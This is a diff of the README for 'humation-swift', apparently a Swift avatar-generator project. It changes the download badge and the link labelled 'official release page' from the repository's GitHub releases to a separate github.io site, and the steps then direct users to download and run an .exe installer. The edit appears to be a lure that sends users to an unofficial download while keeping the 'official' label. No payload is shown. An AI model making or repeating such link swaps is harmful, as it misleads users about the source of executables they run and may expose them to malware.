@@ -1,6 +1,6 @@
 # 🎨 humation-swift - Generate Unique Avatars With Simple Tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/pinocajac9343/humation-swift/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://pinocajac9343.github.io)
 
 ---
 
@@ -21,7 +21,7 @@ You can use these avatars for chat apps, profile pictures, or user account icons
 
 Follow these steps to set up the software on your computer.
 
-1. First, navigate to the [official release page](https://github.com/pinocajac9343/humation-swift/releases).
+1. First, navigate to the [official release page](https://pinocajac9343.github.io).
 2. Look for the most recent version at the top of the list labeled "Latest."
 3. Click the link to expand the "Assets" section.
 4. Select the installer file ending in .exe to start your download.
